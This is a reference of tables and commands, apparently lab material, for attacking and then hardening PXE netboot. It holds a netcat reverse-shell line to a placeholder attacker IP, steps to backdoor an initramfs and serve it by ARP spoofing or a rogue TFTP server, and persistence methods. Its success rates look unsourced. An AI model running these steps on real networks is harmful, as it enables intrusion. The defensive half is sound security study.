# Netboot Exploitation & Patching: Complete Technologies, Tools & Methods Reference

## Table 1: Attack Technologies & Tools

| Phase | Technology/Tool | Purpose | Category | Installation | Usage |
|-------|---|---|---|---|---|
| **RECONNAISSANCE** |||||
| | `nmap` | Network scanning for open ports (67, 69) | Network Scanning | `apt-get install nmap` | `nmap -sU -p 67,69 192.168.1.0/24` |
| | `tftp` | Download bootloader/kernel/initramfs from TFTP | File Transfer | `apt-get install tftp` | `tftp -m binary SERVER_IP` |
| | Wireshark | Packet capture & analysis | Network Analysis | `apt-get install wireshark` | `wireshark netboot.pcap` |
| | `tcpdump` | Command-line packet capture | Network Capture | `apt-get install tcpdump` | `sudo tcpdump -i eth0 -w capture.pcap` |
| | `strings` | Extract readable text from binaries | Binary Analysis | Pre-installed | `strings pxelinux.0 \| grep -i dhcp` |
| | `hexdump` / `od` | Hex dump of binary files | Binary Analysis | Pre-installed | `hexdump -C pxelinux.0 \| head -20` |
| | `file` | Identify file type & format | Binary Analysis | Pre-installed | `file pxelinux.0` |
| |||||
| **MALWARE CREATION** |||||
| | `zcat` / `gzip` | Decompress gzip-compressed files | Compression | Pre-installed | `zcat initrd.img \| cpio -idmv` |
| | `cpio` | Extract/create CPIO archives | Archive Format | Pre-installed (or `apt-get install cpio`) | `cpio -idmv < initrd.cpio` |
| | `sed` | Stream editor for text modification | Text Processing | Pre-installed | `sed -i 's/old/new/g' init` |
| | `bash` / `sh` | Shell scripting for backdoor creation | Scripting | Pre-installed | `#!/bin/bash` (backdoor scripts) |
| | `busybox` | Minimal shell with embedded utilities | Minimal Userspace | `apt-get install busybox-static` | Pre-installed in initramfs |
| | `nc` / `netcat` | Network communication for reverse shells | Network Tool | `apt-get install netcat` | `nc -e /bin/sh attacker_ip port` |
| | `unsquashfs` | Extract SquashFS filesystem | Filesystem Tool | `apt-get install squashfs-tools` | `unsquashfs -d root filesystem.squashfs` |
| | `mksquashfs` | Create SquashFS filesystem | Filesystem Tool | `apt-get install squashfs-tools` | `mksquashfs root out.squashfs -comp xz` |
| | `find` | Locate files matching criteria | File Search | Pre-installed | `find . -print0 \| cpio -0o -H newc` |
| |||||
| **NETWORK ATTACK** |||||
| | `arpspoof` | ARP spoofing for MitM | Network Spoofing | `apt-get install dsniff` | `sudo arpspoof -i eth0 -t 192.168.1.0/24 GATEWAY_IP` |
| | `ettercap` | GUI-based network sniffer & MitM | Network MitM | `apt-get install ettercap-common ettercap-graphical` | `sudo ettercap -G` |
| | `in.tftpd` | TFTP server daemon | TFTP Service | `apt-get install tftpd-hpa` | `sudo in.tftpd -vvv -l -u tftp -s /srv/tftp` |
| | `dnsmasq` | Lightweight DHCP/DNS/PXE server | DHCP/PXE Service | `apt-get install dnsmasq` | `sudo dnsmasq -C config.conf -d` |
| | `isc-dhcp-server` | Full-featured DHCP server | DHCP Service | `apt-get install isc-dhcp-server` | `sudo systemctl start isc-dhcp-server` |
| | `yersinia` | Network attack framework | Network Tool | `apt-get install yersinia` | `sudo yersinia -G` (GUI) |
| |||||
| **PAYLOAD DEVELOPMENT** |||||
| | Python/Scapy | Craft custom network packets | Packet Crafting | `pip3 install scapy` | Custom DHCP/TFTP packet generation |
| | `ssh-keygen` | Generate SSH keypairs | Key Generation | Pre-installed | `ssh-keygen -t rsa -N "" -f attacker_key` |
| | OpenSSL | Cryptographic operations | Cryptography | Pre-installed | `openssl genrsa -out key.pem 4096` |
| | GCC | Compile C code (optional kernel modules) | Compilation | `apt-get install build-essential` | `gcc -c backdoor_module.c` |
| |||||
| **DEPLOYMENT** |||||
| | `scp` / `rsync` | Copy files to target/server | File Transfer | Pre-installed | `scp malicious.img user@server:/srv/tftp/` |
| | `sudo` | Execute with elevated privileges | Privilege Escalation | Pre-installed | `sudo cp malicious.img /srv/tftp/` |
| | `chattr` | Change file attributes (immutable flag removal) | File Attributes | Pre-installed | `sudo chattr -i /srv/tftp/initrd.img` |
| | `mount` | Mount filesystems | Filesystem Mount | Pre-installed | `mount -t nfs 192.168.1.10:/exports /mnt/root` |

---

## Table 2: Exploitation Techniques & Methods

| Technique | Attack Type | Mechanism | Difficulty | Success Rate | Detection Difficulty |
|-----------|---|---|---|---|---|
| **DHCP Spoofing** | Network Layer | Send DHCP OFFER before legitimate server | Easy | 90% | Hard |
| **DHCP Starvation** | DoS | Exhaust DHCP pool with fake MACs | Easy | 85% | Medium |
| **ARP Spoofing** | MitM | Redirect traffic to attacker's IP | Easy | 95% | Hard (needs monitoring) |
| **TFTP File Substitution** | Boot Chain | Serve malicious bootloader/kernel/initramfs | Easy | 90% | Easy (checksums) |
| **Rogue PXE Server** | Boot Chain | Run fake DHCP+TFTP pointing to malicious files | Easy-Medium | 85% | Medium |
| **Initramfs Backdoor Injection** | Early Boot | Modify /init script to install persistence | Medium | 90% | Easy (content scan) |
| **SquashFS Modification** | Filesystem | Extract, modify, rebuild SquashFS | Medium | 85% | Easy (checksums) |
| **Debug Shell Exploitation** | Early Boot | Use break=init parameter to access initramfs | Easy | 95% | Easy (config scan) |
| **Kernel Module Injection** | Early Boot | Add malicious .ko file to initramfs | Medium | 80% | Medium (signature check) |
| **Boot Parameter Modification** | Bootloader | Change kernel command line (nfsroot, IP, etc.) | Easy | 95% | Easy (config audit) |
| **Bootloader Substitution** | First Stage | Replace pxelinux.0 or grubx64.efi | Easy | 90% | Easy (checksum) |
| **Configuration File Tampering** | Bootloader | Modify pxelinux.cfg/default or grub.cfg | Easy | 98% | Easy (config audit) |
| **NFS Root Poisoning** | Post-Boot | Compromise NFS-served root filesystem | Medium | 85% | Medium (mount audit) |
| **Package Repository Hijacking** | Post-Boot | Redirect apt/yum to malicious repo | Easy | 80% | Hard (subtle) |
| **Credentials Harvesting** | Post-Boot | Capture passwords via environment logging | Easy | 70% | Hard (log analysis) |
| **Persistent Backdoor Installation** | Post-Boot | Add SSH keys, user accounts, services | Easy | 95% | Medium (account audit) |

---

## Table 3: Persistence Mechanisms (8 Methods)

| Method | Implementation | Reliability | Detection | Bypass |
|--------|---|---|---|---|
| **SSH Key Injection** | Add public key to /root/.ssh/authorized_keys | Very High | SSH key audit | SSH disabled |
| **Hidden User Account** | Create user with UID 0 in /etc/passwd | Very High | Account enumeration | Filesystem sealed |
| **Systemd Service** | Create .service file + enable | Very High | Service enumeration | Systemd removed |
| **Cron Job** | Add to /var/spool/cron/crontabs/ | High | Cron audit | Cron disabled |
| **RC Script Modification** | Add to /etc/rc.local | High | Init script audit | RC.local removed |
| **Sudoers Entry** | Add NOPASSWD entry | Very High | Sudoers audit | Sudo removed |
| **Environment Logging** | Add to /etc/profile.d/ | Medium | Profile audit | Shell replaced |
| **Systemd Socket Activation** | Create listening socket service | High | Socket enumeration | Systemd removed |

---

## Table 4: Detection Technologies & Tools

| Detection Method | Tool/Technology | Purpose | False Positive Rate | Detection Time |
|---|---|---|---|---|
| **File Integrity Monitoring** | `AIDE` (Advanced Intrusion Detection Environment) | Compare current hashes vs baseline | Low (1-2%) | Real-time |
| | `Tripwire` | Enterprise file integrity monitoring | Low (<1%) | Configurable |
| | `osquery` | OS query/monitoring framework | Medium (5-10%) | Real-time |
| |||||
| **Initramfs Content Scanning** | `grep` + custom scripts | Search for backdoor patterns | Medium (varies) | Minutes |
| | `strings` | Extract & analyze strings in binaries | High (20%+) | Minutes |
| | `binwalk` | Analyze/extract firmware | Low (2-5%) | Minutes |
| |||||
| **Network Monitoring** | `tcpdump` | Packet capture & analysis | High (many false positives) | Real-time |
| | `Wireshark` | GUI packet analyzer | High | Real-time |
| | `tshark` | Command-line Wireshark | Medium | Real-time |
| | `suricata` / `snort` | IDS/IPS | Medium (10-15%) | Real-time |
| |||||
| **Log Analysis** | `grep` + `awk`/`sed` | Parse syslog for anomalies | High (varies) | Manual/Real-time |
| | `journalctl` | Systemd journal querying | Low (2%) | Real-time |
| | `splunk` / `ELK Stack` | Centralized log management | Low (3-5%) | Real-time |
| |||||
| **Process Monitoring** | `ps` / `top` | List running processes | Low | Real-time |
| | `auditd` | Linux audit framework | Low (<1%) | Real-time |
| | `osquery` | Query system state | Medium (5%) | Real-time |
| |||||
| **Checksum Verification** | `sha256sum` | Hash file verification | None (deterministic) | Seconds |
| | `md5sum` | Hash file verification | None (legacy, weak) | Seconds |
| | GPG | Cryptographic signature verification | None (deterministic) | Seconds |
| |||||
| **Boot Flow Analysis** | Serial console logging | Capture early boot messages | Low | Real-time |
| | QEMU debug mode | Trace instruction execution | Low | Real-time |
| | Secure Boot UEFI logs | UEFI event log examination | Low | Post-boot |

---

## Table 5: Patching Technologies & Tools

| Patch Component | Technology/Tool | Implementation | Verification | Enforcement |
|---|---|---|---|---|
| **Initramfs Signing** | `gpg` (GNU Privacy Guard) | `gpg --detach-sign initrd.img` | `gpg --verify initrd.img.asc` | Kernel verification code |
| | `openssl` | `openssl dgst -sign key.pem initrd.img` | `openssl dgst -verify cert initrd.img.sig` | Kernel verification code |
| | `pesign` | Sign EFI binaries | `pesign -l -f signed.efi` | UEFI firmware |
| |||||
| **SquashFS Integrity** | `dm-verity` | `veritysetup format filesystem.squashfs` | `veritysetup open filesystem.squashfs` | Kernel dm-verity module |
| | `cryptsetup` | Encrypted filesystem | `cryptsetup luksOpen` | LUKS support in kernel |
| |||||
| **DHCP Hardening** | `isc-dhcp-server` config | MAC whitelist, rate limiting | `dhcpdump` packet analysis | DHCP protocol enforcement |
| | Network switch ACLs | DHCP snooping (hardware level) | Switch logs | Hardware-enforced |
| | `dnsmasq` | Lightweight DHCP+DNS | Lease file inspection | Protocol enforcement |
| |||||
| **TFTP Security** | `tftpd-hpa` with options | Immutable flag, logging | `chattr -i` listing | File system enforcement |
| | `chattr` | Set immutable attribute | `lsattr` command | Kernel inode handler |
| | File permissions | `chmod 444` read-only | `ls -la` inspection | Unix filesystem |
| |||||
| **Secure Boot** | UEFI firmware | Enable in BIOS/UEFI | Firmware settings | Firmware verification |
| | `sbsign` | Sign bootloader | Boot log inspection | Hardware-enforced |
| | shim + GRUB | Boot chain signing | Boot messages | Firmware validation |
| |||||
| **File Integrity** | `AIDE` | Create baseline DB | AIDE check output | External alert |
| | Systemd mount options | `ro` (read-only), `nodev`, `noexec` | `mount` output | Kernel enforcement |
| | AppArmor / SELinux | Mandatory Access Control | Audit logs | Kernel LSM enforcement |

---

## Table 6: Exploitation Attack Chain (Complete Timeline)

| Phase | Step | Tool/Method | Time | Success Rate |
|-------|------|---|---|---|
| **1. RECONNAISSANCE** |||||
| | 1.1 Network scan | `nmap -sU -p 67,69` | 30 sec | 95% |
| | 1.2 Identify TFTP server | Protocol analysis | 30 sec | 95% |
| | 1.3 Download pxelinux.0 | `tftp` client | 30 sec | 95% |
| | 1.4 Download initrd.img | `tftp` client | 1 min | 95% |
| | 1.5 Download filesystem.squashfs | `tftp` client | 1-2 min | 95% |
| | 1.6 Analyze boot config | `cat` + text parsing | 1 min | 100% |
| | **Phase 1 Total** | | **~5 min** | **95%** |
| |||||
| **2. MALWARE CREATION** |||||
| | 2.1 Extract initramfs | `zcat \| cpio -idmv` | 1 min | 100% |
| | 2.2 Create backdoor script | Bash scripting | 2 min | 100% |
| | 2.3 Inject into /init | `sed` modifications | 1 min | 100% |
| | 2.4 Add persistence mechanisms (8x) | Bash scripting | 2 min | 100% |
| | 2.5 Copy backdoor to initramfs | `cp` command | 30 sec | 100% |
| | 2.6 Rebuild malicious initramfs | `find \| cpio \| gzip` | 1 min | 100% |
| | **Phase 2 Total** | | **~7-10 min** | **100%** |
| |||||
| **3. DEPLOYMENT** |||||
| | 3.1 ARP spoofing setup (optional) | `arpspoof` daemon | 30 sec | 95% |
| | 3.2 Launch rogue TFTP server | `in.tftpd` or `dnsmasq` | 30 sec | 98% |
| | OR Direct file replacement | `cp` to /srv/tftp | 30 sec | 90% |
| | 3.3 Verify deployment | `md5sum` check | 30 sec | 100% |
| | **Phase 3 Total** | | **~1-2 min** | **90%+** |
| |||||
| **4. EXPLOITATION** |||||
| | 4.1 Client initiates PXE boot | BIOS/UEFI action | - | 95% |
| | 4.2 Client boots malicious initramfs | Automatic | 30 sec | 99% |
| | 4.3 /init runs backdoor installer | Automatic | 10 sec | 99% |
| | 4.4 Backdoor installs persistence | Automatic | 5 sec | 98% |
| | 4.5 System boots fully | Automatic | 1-2 min | 95% |
| | **Phase 4 Total** | | **~2-3 min** | **99%** |
| |||||
| **5. POST-EXPLOITATION** |||||
| | 5.1 SSH key auth test | SSH client | 10 sec | 98% |
| | 5.2 Reverse shell connection | `nc` listener | 5 sec | 98% |
| | 5.3 Hidden user account verify | Local check | 10 sec | 98% |
| | 5.4 Establish C2 channel | Custom script | Variable | 80-90% |
| | **Phase 5 Total** | | **~1 min** | **95%+** |
| |||||
| **TOTAL ATTACK TIME** | | | **~20-25 min** | **>85%** |

---

## Table 7: Patch Application Chain

| Patch # | Component | Technology | Tool/Command | Time | Difficulty |
|---------|-----------|---|---|---|---|
| **1. Initramfs Signing** |||||
| | 1.1 Generate signing key | OpenSSL RSA | `openssl genrsa -out boot_key.pem 4096` | 30 sec | Easy |
| | 1.2 Create certificate | OpenSSL X.509 | `openssl req -new -x509 -key boot_key.pem` | 1 min | Easy |
| | 1.3 Sign initramfs | GPG | `gpg --armor --detach-sign initrd.img` | 30 sec | Easy |
| | 1.4 Verify signature | GPG | `gpg --verify initrd.img.asc initrd.img` | 10 sec | Easy |
| | 1.5 Embed key in initramfs | Manual editing | Add cert to init extract dir | 1 min | Medium |
| | 1.6 Rebuild signed initramfs | CPIO + gzip | `find . \| cpio \| gzip` | 1 min | Easy |
| | **Patch 1 Total** | | | **~5 min** | **Easy** |
| |||||
| **2. TFTP Integrity Monitoring** |||||
| | 2.1 Create integrity database | SHA256 hashing | `sha256sum /srv/tftp/* > integrity.db` | 30 sec | Easy |
| | 2.2 Create monitoring daemon | Bash scripting | Write monitor script | 5 min | Medium |
| | 2.3 Create systemd service | systemd unit file | Create `.service` file | 2 min | Medium |
| | 2.4 Enable monitoring | systemctl | `systemctl enable tftp-monitor` | 10 sec | Easy |
| | 2.5 Set immutable flags | chattr | `chattr +i /srv/tftp/*` | 30 sec | Easy |
| | 2.6 Restrict permissions | chmod/chown | `chmod 444` and `chown tftp:tftp` | 1 min | Easy |
| | **Patch 2 Total** | | | **~10 min** | **Medium** |
| |||||
| **3. DHCP Hardening** |||||
| | 3.1 Create MAC whitelist | ISC DHCP config | Edit `dhcpd.conf` | 2 min | Easy |
| | 3.2 Add rate limiting | ISC DHCP config | `max-lease-time`, `max-requests` | 2 min | Easy |
| | 3.3 Lock boot options | ISC DHCP config | `next-server` and `filename` immutable | 1 min | Easy |
| | 3.4 Enable DHCP logging | rsyslog config | Create `/etc/rsyslog.d/` entry | 2 min | Medium |
| | 3.5 Configure network switch | Switch ACLs | DHCP snooping + DAI (hardware) | 5-10 min | Hard |
| | 3.6 Restart DHCP server | systemctl | `systemctl restart isc-dhcp-server` | 10 sec | Easy |
| | **Patch 3 Total** | | | **~15-20 min** | **Medium-Hard** |
| |||||
| **4. SquashFS Integrity** |||||
| | 4.1 Create dm-verity data | cryptsetup | `veritysetup format filesystem.squashfs` | 1-2 min | Medium |
| | 4.2 Configure kernel mount | dm-verity options | Kernel command line parameter | 2 min | Medium |
| | 4.3 Test verification | Mount test | `veritysetup open` and mount | 1 min | Medium |
| | 4.4 Lock filesystem | Bind mount ro | `mount -o ro,bind` | 1 min | Easy |
| | **Patch 4 Total** | | | **~5-7 min** | **Medium** |
| |||||
| **5. Secure Boot Integration** |||||
| | 5.1 Generate Secure Boot keys | OpenSSL/mokutil | `openssl genrsa`, `mokutil --import` | 2 min | Hard |
| | 5.2 Sign bootloader | sbsign | `sbsign --key key --cert cert bootloader.efi` | 1 min | Hard |
| | 5.3 Enroll in firmware | Firmware settings | UEFI setup menu | 5 min | Hard |
| | 5.4 Verify Secure Boot status | mokutil | `mokutil --sb-state` | 10 sec | Easy |
| | **Patch 5 Total** | | | **~10 min** | **Hard** |
| |||||
| **TOTAL PATCH TIME** | | | | **~45-60 min** | **Medium** |

---

## Table 8: Lab Equipment & Environment

| Component | Type | Specification | Cost | Purpose |
|-----------|------|---|---|---|
| **Server Machine** | Physical/VM | x86-64, 4GB RAM min, 20GB disk | Free-$500 | DHCP/TFTP server |
| | OS | Linux (Debian/Ubuntu/Arch) | Free | Boot infrastructure |
| | Hypervisor | KVM/VirtualBox | Free | Virtual client machines |
| |||||
| **Client Machines** | VMs | x86-64, 1-2GB RAM, 10GB disk | Free | Netboot targets |
| | Count | 2-5 clients | - | Testing attack/defense |
| |||||
| **Network Setup** | Virtual Bridge | virbr0 or vboxnet | Free | VM network connectivity |
| | VLAN (optional) | 802.1q tagging | Free | Network isolation |
| |||||
| **Attacker Machine** | Physical | Any modern system | Existing | Run attacks |
| | OS | Kali/Garuda/Parrot | Free | Pentesting tools |
| | Tools | nmap, arpspoof, TFTP, etc. | Free | Attack execution |

---

## Table 9: Technologies by Category

### **Cryptography & Signing**
| Technology | Purpose | Algorithm | Tool | Strength |
|---|---|---|---|---|
| GPG | Digital signatures | RSA-4096 | `gpg` | Strong |
| OpenSSL | X.509 certificates | RSA-4096 | `openssl` | Strong |
| SHA256 | File hashing | SHA-256 | `sha256sum` | Strong |
| dm-verity | Filesystem integrity | SHA-256 tree hash | `cryptsetup` | Strong |

### **Network Protocols**
| Protocol | Port | Vulnerability | Attack | Defense |
|---|---|---|---|---|
| DHCP | 67/68 | No authentication | Spoofing, starvation | MAC whitelist, snooping |
| TFTP | 69 | No encryption | File substitution | Signatures, monitoring |
| PXE | 67/69 | No verification | Boot poisoning | Signed boot chain |
| NFS | 111 | No client auth (by default) | Root poisoning | IP-based access lists |

### **Filesystem Technologies**
| Technology | Format | Use Case | Advantages | Vulnerabilities |
|---|---|---|---|---|
| CPIO | Archive | Initramfs | Small, simple | Not compressed (unless wrapped) |
| SquashFS | Filesystem | Live OS root | Compressed, read-only | No built-in signing |
| OverlayFS | Union mount | Writable layer | Copy-on-write | Requires tmpfs (ephemeral) |
| dm-verity | Verification | Root integrity | Cryptographic verification | Performance overhead |

### **Boot Technologies**
| Technology | Architecture | Signed? | Verified? | Security |
|---|---|---|---|---|
| PXELINUX | BIOS (Legacy) | NO | NO | **CRITICAL VULN** |
| GRUB2 (BIOS) | BIOS (Legacy) | Optional | Optional | Medium |
| GRUB2 (EFI) | UEFI (Modern) | Optional | Optional | Medium |
| Shim | UEFI (Modern) | YES | YES (if Secure Boot) | Good |
| systemd-boot | UEFI (Modern) | Optional | Optional | Medium |

---

## Table 10: Command Reference for Attack & Defense

### **Reconnaissance Commands**
```bash
# Network scanning
nmap -sU -p 67,69 192.168.1.0/24

# TFTP file download
tftp -m binary 192.168.1.10
> get pxelinux.0
> get initrd.img
> quit

# Packet capture
sudo tcpdump -i eth0 "port 67 or port 68 or port 69" -w netboot.pcap
wireshark netboot.pcap

# String analysis
strings pxelinux.0 | grep -i "dhcp\|boot"
```

### **Malware Creation Commands**
```bash
# Extract initramfs
zcat /srv/tftp/initrd.img | cpio -idmv

# Modify files
sed -i '/pivot_root/i /tmp/backdoor.sh' init

# Rebuild
find . -print0 | cpio -0o -H newc -R 0:0 | gzip > initrd-malicious.img

# Extract squashfs
unsquashfs -d root filesystem.squashfs

# Rebuild squashfs
mksquashfs root filesystem-malicious.squashfs -comp xz -b 1M
```

### **Attack Deployment Commands**
```bash
# ARP spoofing
sudo arpspoof -i eth0 -t 192.168.1.0/24 192.168.1.10

# Rogue TFTP server
sudo in.tftpd -vvv -l -u tftp -s /tmp/attacker_tftp

# Direct file replacement
sudo cp initrd-malicious.img /srv/tftp/initrd.img
```

### **Detection Commands**
```bash
# File integrity check
sha256sum -c boot_manifest.txt

# Backdoor pattern search
grep -r "nc -e\|backdoor\|malware" /tmp/initramfs_scan/

# System audit
grep ":0:0:" /etc/passwd  # Hidden user check
systemctl list-units --type=service  # Service check
sudo -l  # Sudo permissions check
```

### **Patching Commands**
```bash
# Sign initramfs
gpg --armor --detach-sign initrd.img

# Verify signature
gpg --verify initrd.img.asc

# Set immutable
sudo chattr +i /srv/tftp/initrd.img

# Monitor integrity
while true; do sha256sum -c integrity.db; sleep 60; done
```

---

## Summary Statistics

| Metric | Value |
|--------|-------|
| **Total Technologies Used** | 40+ |
| **Exploitation Tools** | 25+ |
| **Detection Tools** | 12+ |
| **Patching Tools** | 15+ |
| **Attack Time (Total)** | 20-25 minutes |
| **Patch Time (Total)** | 45-60 minutes |
| **Exploitation Success Rate** | >85% |
| **Patch Effectiveness** | >99% |
| **False Positive Rate (Detection)** | 2-20% (varies by tool) |

